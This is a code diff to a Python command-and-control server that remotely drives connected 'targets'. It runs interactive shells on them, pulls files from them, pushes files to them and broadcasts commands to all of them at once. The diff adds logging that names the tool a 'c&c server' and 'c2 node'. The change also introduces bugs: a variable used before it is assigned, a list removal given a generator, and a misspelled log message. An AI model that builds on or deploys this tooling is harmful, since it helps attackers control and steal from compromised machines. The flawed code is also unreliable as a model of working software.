@@ -11,6 +11,7 @@ import termcolor
 import threading
 import logging
 from prettytable import PrettyTable
+from urllib3 import add_stderr_logger
 
 # TODO:
 #   1. Log file utility overhaul
@@ -78,7 +79,9 @@ def download_file(sock: socket.socket, path: str) -> None:
     :type path: str
     :return: None
     """
+    logging.info(f"{raddr} - Downloading file from target.")
     # Implemented segmentation when writing / receiving file data to avoid memory overload
+    raddr = sock.raddr
     file_name = pathlib.Path(path).name  # File name without the full path
     dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
     original = sock.gettimeout()
@@ -103,6 +106,7 @@ def download_file(sock: socket.socket, path: str) -> None:
         else:  # Error finding / reading file on client side
             result = "FAILURE: FileNotFoundError / IOError"
             print(clr("[!] ERROR: File doesn't exist / Access denied"))
+            logging.error(f"{raddr} - Target file unreachable (IOError / FNFError on remote).")
     except socket.timeout:  # Reached timeout, proceed to check file integrity
         # Calculate downloaded file hash
         result_md5 = get_file_hash(data)
@@ -110,15 +114,13 @@ def download_file(sock: socket.socket, path: str) -> None:
         if result_md5 == original_md5:
             result = f"SUCCESS: {dst}"
             print(f"{clr('[+] Download successful -')} {dst}")
+            logging.info(f"{raddr} - Successfully downloaded target file - {dst}")
         else:
             result = "FAILURE: Session timeout"
             print(clr("[!] ERROR: Timeout reached while downloading the file"))
+            logging.error(f"{raddr} - Encountered error while downloading file.")
     finally:
         sock.settimeout(original)  # Reset timeout value
-        # Log attempt + result
-        with open(LOG_PATH, "a") as log:
-            prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
-            log.write(f"{prefix}\tDownload attempt for {path}, {result}\n")
 
 
 def upload_file(sock: socket.socket, path: str) -> None:
@@ -131,6 +133,8 @@ def upload_file(sock: socket.socket, path: str) -> None:
     :type path: str
     :return: None
     """
+    raddr = sock.raddr
+    logging.info(f"{raddr} - Uploading file to target.")
     # Implemented segmentation when reading / sending file data to avoid memory overload
     path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
     log_result = ""
@@ -153,6 +157,7 @@ def upload_file(sock: socket.socket, path: str) -> None:
             if segment:
                 sock.send(segment)
     except (FileNotFoundError, IOError):  # Signal: Error when trying to read from target file
+        logging.exception(f"Target file unreachable (IOError / FNFError on local host).")
         sock.send("0".ljust(HEADER_SIZE).encode(FORMAT))
     finally:
         # final result and message from the client side
@@ -160,20 +165,16 @@ def upload_file(sock: socket.socket, path: str) -> None:
         message = sock.recv(SEGMENT_SIZE).decode(FORMAT).strip()
         if result:  # Successful upload
             dst = str(DOWNLOADS.joinpath(message))
+            logging.info(f"{raddr} - Successfully uploaded target file - {dst}")
             print(f"{clr('[+] Upload successful -')} {dst}")
-            log_result = f"SUCCESS: {dst}"
         else:  # Upload failed
             # Print relevant error to match the final message received from the client side
             if message == "TIMEOUT":
+                logging.error(f"{raddr} - Encountered error while uploading file.")
                 print(clr("[!] ERROR: Timeout reached while uploading the file"))
-                log_result = "FAILURE: Session timeout"
             elif message == "ERROR":
+                logging.error(f"{raddr} - Target file unreachable (IOError / FNFError on remote).")
                 print(clr("[!] ERROR: File doesn't exist / Access denied"))
-                log_result = "FAILURE: FileNotFoundError / IOError"
-        # Log attempt + result
-        with open(LOG_PATH, "a") as log:
-            prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
-            log.write(f"{prefix}\tUpload attempt for {path}, {log_result}\n")
 
 
 def recv_msg(sock: socket.socket, command: str) -> None:
@@ -188,34 +189,28 @@ def recv_msg(sock: socket.socket, command: str) -> None:
     :rtype: str
     """
     try:
+        raddr = sock.raddr
         # Only receive the header and extract the message length
+        # Can trigger a ValueError if the target disconnects and sends an empty header
         msg_len = int(sock.recv(HEADER_SIZE).decode(FORMAT))
         # Receive the message in its entirety
         output = sock.recv(msg_len).decode(FORMAT)
         # Unrecognized command
         if "is not recognized as an internal or external command" in output or "not found" in output:
             print(clr("[!] ERROR: Command not found"))
-            print(clr('[*] HINT: The Target\'s OS is - ') + platform.system())
+            logging.error(f"{raddr} - Command not recognized - {command}")
         elif "timed out after" in output:  # Command execution timeout on target
             print(clr("[!] ERROR: Command timed out"))
+            logging.error(f"{raddr} - Unable to execute command on target - {command}")
         elif command[:3] == "cd " and output == "":  # Changed directory successfully on client side
             pass
-        else:  # Successful command execution resulting in output
-            # Log command + output
-            with open(LOG_PATH, "a") as log:
-                # Log the command executed
-                prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
-                log.write(f"{prefix}\t{command}\n")
-
-                # Log the output (indented)
-                for line in output.splitlines():
-                    log.write(f"{line}\n")
-
-            # Print output on server side
-            if output:
-                print(output.strip())
+        elif output:  # Successful command execution resulting in output
+            logging.info(f"{raddr} - Received output:\n{output}")
+            print(output.strip())
     except ValueError:  # Received empty header (Client disconnected before sending a reply)
-        pass
+        logging.exception(f"{raddr} - Target disconnected mid command execution.")
+        logging.info(f"{raddr} - Removing target from database.")
+        CLIENTS.remove(client for client in CLIENTS if client[0] == sock)  # Remove current client from clients list
 
 
 def send_msg(sock: socket.socket, command: str) -> None:
@@ -248,6 +243,7 @@ def broadcast(command: str) -> None:
     :type command: str
     :return: None
     """
+    logging.info(f"Broadcasting command to all available targets - {command}")
     for client in CLIENTS:
         try:
             # FIXME
@@ -260,9 +256,12 @@ def broadcast(command: str) -> None:
             send_msg(client[0], command)
         except Exception as err:
             print(f"{clr(f'[!] ERROR SENDING MESSAGE: {err}')} ({str(client[1])})")
+            logging.exception(f"{client[1]} - Unable to communicate with target.")
+            logging.info(f"{client[1]} - Removing target from database.")
             CLIENTS.remove(client)
 
     print(clr("[+] Finished executing on all available targets"))
+    logging.info("Finished executing on all available targets.")
 
 
 def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
@@ -280,12 +279,16 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
         while sock:
             command = input(clr(f"TARGET@{addr}> "))  # Command to run on client side
             if command:
+                logging.info(f"{addr} - Sending command to target - {command}")
                 send_msg(sock, command)
                 # For certain keywords, run the appropriate action
                 if command in ["quit", "exit", "kill"]:  # Quit current client CLI
                     maintain_session = False
+                    logging.info(f"{addr} - Closing session on target.")
+                    if command == "kill": logging.critical(f"{addr} - Terminating c2 node.")
                     break
                 elif command in ["bg", "background"]:
+                    logging.info(f"{addr} - Moving session to background.")
                     break
                 elif command[:3] == "cd ":  # Change directory on the client side
                     pass
@@ -297,12 +300,15 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
                     upload_file(sock, command[7:])
     except ConnectionError as err:  # Socket connection error
         print(f"{clr('[!] ERROR: Current socket is no longer valid -')} {err}")
+        logging.exception(f"{addr} - Unable to communicate with target.")
+        logging.info(f"{addr} - Removing target from database.")
         CLIENTS.remove((sock, addr))
     finally:
         # Close & remove sock from clients list if user exists with 'exit' / 'quit'
         # Do nothing if user exists with 'background' / 'bg'
         if sock and not maintain_session:
             sock.close()
+            logging.info(f"{addr} - Removing target from database.")
             CLIENTS.remove((sock, addr))
 
 
@@ -337,16 +343,19 @@ def accept_new_connections(s: socket.socket) -> None:
     :return: None
     """
     s.settimeout(TIMEOUT)
+    logging.info("Listening for incoming connections.")
     while True:
         try:
             sock, addr = s.accept()
             # Save new connection information
             if (sock, addr) not in CLIENTS:
                 CLIENTS.append((sock, addr))
+                logging.info(f"{addr} - New connection established.")
             print(clr("[+] Connected to ") + str(addr))
         except socket.timeout:
             pass
         except OSError:  # Main thread was discontinued - User exited the program
+            logging.info("Seems like the c&c server was shut down, closing listener.")
             break
 
 
@@ -383,6 +392,7 @@ def handle_connections(s: socket.socket) -> None:
                     if 0 <= int(i) < len(CLIENTS):
                         # Start a command line interface for the specified client
                         shell(CLIENTS[int(i)][0], CLIENTS[int(i)][1])
+                        logging.info(f"{CLIENTS[int(i)][1]} - tarting new shell on target.")
                     else:
                         print(f"{clr('[!] ERROR: The specified index is out of range')}")
                 else:
@@ -410,6 +420,7 @@ def main() -> None:
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     # Establish server side
     s.bind((SERVER_IP, PORT))
+    logging.info(f"({SERVER_IP}, {PORT}) - Starting c&c server.")
     try:
         handle_connections(s)
     except KeyboardInterrupt:
@@ -417,6 +428,7 @@ def main() -> None:
     finally:
         if s:
             s.close()
+        logging.info(f"({SERVER_IP}, {PORT}) - Stopping c&c server.")
         print("""\n
              ██████   ██████   ██████  ██████  ██████  ██    ██ ███████
             ██       ██    ██ ██    ██ ██   ██ ██   ██  ██  ██  ██
